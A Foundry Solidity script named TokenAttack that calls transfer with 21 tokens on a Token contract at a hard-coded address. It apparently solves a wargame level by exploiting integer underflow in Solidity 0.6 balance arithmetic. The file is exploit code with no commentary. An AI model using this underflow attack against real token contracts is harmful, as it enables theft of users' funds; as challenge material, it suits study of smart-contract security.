// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "../src/Token.sol";

contract TokenAttack is Script {
    Token tokenContract = Token(0x7BCfA24e1276f6Fd70326815F73Db8a13D02601e);

    function run() public {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(privateKey);
        tokenContract.transfer(msg.sender, 21);
        tokenContract.balanceOf(msg.sender);
        vm.stopBroadcast();
    }
}
